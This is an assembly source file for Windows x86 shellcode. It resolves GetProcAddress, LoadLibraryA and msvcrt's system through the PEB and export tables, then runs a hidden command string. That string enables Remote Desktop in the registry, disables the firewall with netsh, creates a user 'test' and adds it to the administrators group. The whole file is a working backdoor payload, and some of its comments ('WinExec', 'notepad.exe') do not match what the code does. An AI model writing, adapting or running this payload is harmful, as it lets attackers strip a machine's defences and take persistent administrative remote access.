section .text
global _start
_start:
        pushad      ; push all gpr

        ; Establish a new stack frame
        push ebp
        mov ebp, esp

        sub esp, 0x18                   ; lift up stack, reserve space for local variables

        ; Find kernel32.dll base address
        xor esi, esi                    ; esi = 0
        mov ebx, [fs:esi+0x30]          ; avoid null bytes, to be compatible with fasm, for nasm, use fs:[eax+0x30]
        mov ebx, [ebx + 0x0C]
        mov ebx, [ebx + 0x14] 
        mov ebx, [ebx]  
        mov ebx, [ebx]  
        mov ebx, [ebx + 0x10]           ; now ebx holds kernel32.dll base address

        ; push the function name onto the stack
        xor esi, esi
        push esi                        ; null termination
        push 0x00007373
        push 0x65726464
        push 0x41636f72
        push 0x50746547
        mov [ebp-4], esp                ; pointer to "GetProcAddress" is at ebp-0x4
        mov [ebp-8], ebx                ; base address of kernel32.dll is at ebp-0x8

        ; Find the address of the export table
        mov eax, [ebx + 0x3c]           ; RVA of PE signature
        add eax, ebx                    ; address of PE signature
        mov eax, [eax + 0x78]           ; RVA of export table
        add eax, ebx                    ; address of export table

        ; Find number of exported functions
        mov edx, [eax + 0x14]           ; number of exported functions

        ; Find the address of the address table
        mov ecx, [eax + 0x1c]           ; RVA of address table
        add ecx, ebx                    ; address of address table
        mov [ebp-0x14], ecx             ; address of address table is at ebp-0x14

        ; Find the address of the name pointer table
        mov ecx, [eax + 0x20]           ; RVA of name pointer table
        add ecx, ebx                    ; address of name pointer table
        mov [ebp-0x10], ecx             ; address of name pointer table is at ebp-0x10

        mov ecx, [eax + 0x24]           ; RVA of ordinal table
        add ecx, ebx                    ; address of ordinal table
        mov [ebp-0xc], ecx              ; address of ordinal table is at ebp-0xc

        xor eax, eax                    ; cnt = 0

        .loop:
                mov edi, [ebp-0x10]     ; edi holds the address of name pointer table
                mov esi, [ebp-4]        ; esi points to "GetProcAddress"
                xor ecx, ecx

                cld                     ; set DF=0 => process strings from left to right
                mov edi, [edi + eax*4]  ; edi holds the rva of the entries in name pointer table
                add edi, ebx            ; edi holds the address of the function name
                add cx, 0xe             ; length of strings to compare (len('GetProcAddress') = 14 = 0xe)
                repe cmpsb              ; compare the strings pointed by esi and edi byte by byte. if equal, ZF=1, otherwise, ZF=0
                jz _start.found         ; if not zero, two strings are equal. found it!

                inc eax                 ; cnt++
                cmp eax, edx            ; check if last function is reached
                jb _start.loop          ; if not the last -> go back to the beginning of the loop

                add esp, 0x24                    
                jmp _start.end          ; if function is not found, jump to the end

        .found:
                ; the counter (eax) now holds the position of WinExec

                mov ecx, [ebp-0xc]      ; ecx holds the address of the ordinal table
                mov edx, [ebp-0x14]     ; edx holds the address of the address table

                mov ax, [ecx + eax*2]   ; eax holds the ordinal number of the target function `GetProcAddress` in ordinal table
                mov eax, [edx + eax*4]  ; eax holds the RVA of the target function `GetProcAddress`
                add eax, ebx            ; eax holds the address of the target function `GetProcAddress`

        ; use GetProcAddress to find the address of LoadLibraryA in kernel32.dll
        mov [ebp-0x4], eax              ; address of "GetProcAddress" at [ebp-0x04]
        mov esp, ebp
        sub esp, 0x8                    ; esp now points to the base address of kernel32.dll
        xor ecx, ecx
        push ecx                        ; null termination
        push 0x41797261
        push 0x7262694c
        push 0x64616f4c                 ; "LoadLibraryA"
        push esp                        ; push the pointer of the string "LoadLibraryA"
        mov ecx, [ebp-0x8]
        push ecx                        ; push the base address of kernel32.dll
        call eax                        ; call "GetProcAddress" to get the address of LoadLibraryA

        ; use LoadLibraryA to load msvcrt.dll
        mov [ebp-0xc], eax              ; address of "LoadLibraryA" at [ebp-0xc]
        mov esp, ebp                    ; rebase the stack
        sub esp, 0xc                    ; esp now points to the address of LoadLibraryA
        xor ecx, ecx
        push ecx
        push 0x00006c6c
        push 0x642e7472
        push 0x6376736d                 ; "msvcrt.dll"
        push esp
        call eax                        ; push the pointer of the string "msvcrt.dll"

        ; use GetProcAddress to find the address of system in msvcrt.dll
        mov [ebp-0x10], eax             ; base address of msvcrt.dll at [ebp-0x10]
        mov esp, ebp                    ; rebase the stack
        sub esp, 0x10                   ; esp now points to the base address of msvcrt.dll
        push 0x00006d65
        push 0x74737973                 ; "system"
        push esp                        ; push the pointer of the string "system"
        push eax                        ; push the base address of msvcrt.dll
        mov eax, [ebp-0x4]              ; move the address of "GetProcAddress" to eax
        call eax                        ; call "GetProcAddress"

        ; use system to execute arbitrary command
        push 0x00000064
        push 0x64612f20
        push 0x74736574
        push 0x2073726f
        push 0x74617274
        push 0x73696e69
        push 0x6d646120
        push 0x70756f72
        push 0x676c6163
        push 0x6f6c2074
        push 0x656e2026
        push 0x26206464
        push 0x612f2074
        push 0x73657420
        push 0x74736574
        push 0x20726573
        push 0x75207465
        push 0x6e202626
        push 0x20656c62
        push 0x61736964
        push 0x3d65646f
        push 0x6d206564
        push 0x6f6d706f
        push 0x20746573
        push 0x206c6c61
        push 0x77657269
        push 0x66206873
        push 0x74656e20
        push 0x26262066
        push 0x2f203030
        push 0x30303030
        push 0x30302064
        push 0x2f204452
        push 0x4f57445f
        push 0x47455220
        push 0x742f2073
        push 0x6e6f6974
        push 0x63656e6e
        push 0x6f435354
        push 0x796e6544
        push 0x6620762f
        push 0x20726576
        push 0x72655322
        push 0x20226c61
        push 0x6e696d72
        push 0x65545c6c
        push 0x6f72746e
        push 0x6f435c74
        push 0x65536c6f
        push 0x72746e6f
        push 0x43746e65
        push 0x72727543
        push 0x5c4d4554
        push 0x5359535c
        push 0x4d4c4b48
        push 0x20444441
        push 0x20474552			; "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh firewall set opmode mode=disable && net user test test /add && net localgroup administrators test /add"
        push esp                        ; push the pointer of the string "notepad.exe"
        call eax                        ; call "system"

        .end:

